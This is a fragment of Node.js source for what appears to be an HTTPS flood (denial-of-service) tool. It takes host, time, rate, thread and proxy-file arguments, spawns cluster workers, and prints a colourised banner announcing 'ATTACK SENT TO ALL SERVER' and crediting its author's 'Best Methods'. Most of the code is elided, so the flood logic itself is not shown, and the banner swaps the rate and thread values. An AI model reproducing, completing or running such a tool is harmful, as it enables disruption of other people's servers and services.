...
'*'
 ...
 if (process.argv.length < 7){console.log(`How to sent | host + time + rate + thread + proxyfile`); process.exit();}
 const headers = {};
...
if (cluster.isMaster) {
    ...
    console.clear();
    console.log('\033[1;37mHTTPS V2 \033[1;31m| \033[1;4m\033[1;33mATTACK SENT TO ALL SERVER\033[0m');
    console.log('\033[0;38m----------------------');
    console.log('\033[1;33m' + 'Host: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\033[1;33m' + 'Time: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
    console.log('\033[1;33m' + 'Rate: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\033[1;33m' + 'Thread: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
    console.log('\033[0;38m----------------------');
    console.log('\033[1;34mNote : \033[1;37mHave Methods Make By @haibe206 \033[1;31m| \033[1;37mThe Best Methods');
